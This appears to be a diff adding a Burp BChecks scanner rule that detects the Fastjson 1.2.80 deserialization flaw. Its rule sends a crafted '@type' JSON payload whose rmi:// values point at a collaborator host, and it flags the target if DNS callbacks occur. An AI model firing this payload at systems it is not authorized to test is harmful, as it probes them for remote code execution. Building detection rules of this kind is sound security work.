@@ -1,0 +1,25 @@
+metadata:
+  language: v1-beta
+  name: "Fastjson 1.2.80 Deserialization RCE"
+  description: "https://github.com/su18/hack-fastjson-1.2.80"
+  author: "Javeley"
+  tags: "Fastjson", "Deserialization","RCE","Alibaba"
+
+define:
+    payload =`[\{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","x": \{"@type": "java.net.InetSocketAddress"\{"address":,"val": "rmi://{generate_collaborator_address()}/{random_str(4)}"}}},\{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","message": \{"@type": "java.net.InetSocketAddress"\{"address":,"val": "rmi://{generate_collaborator_address()}/{random_str(4)}"}}}]`
+
+
+given request then
+
+  if {base.request.body} matches "^[{]" and "application/json" in {base.request.headers} then
+      send request:
+          body: {payload}
+
+      if dns interactions then
+          report issue:
+              severity: high
+              confidence: certain
+              detail: "If two DNS requests are received, it proves version 1.2.83 is used. If one DNS request is received, it proves version 1.2.80 is used.https://github.com/su18/hack-fastjson-1.2.80."
+              remediation: ""
+      end if 
+  end if
